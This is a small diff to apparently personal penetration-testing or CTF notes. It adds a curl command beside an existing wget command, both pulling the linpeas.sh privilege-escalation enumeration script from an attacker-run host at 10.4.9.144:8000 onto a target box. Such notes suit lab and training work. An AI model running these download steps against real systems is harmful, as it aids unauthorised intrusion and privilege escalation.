@@ -193,6 +193,10 @@ get on box
 ```
 wget http://10.4.9.144:8000/linpeas.sh
 ```
+
+```
+curl 10.4.9.144:8000/linpeas.sh > linpeas.sh
+```
 ## download files from box
 
 on own machine
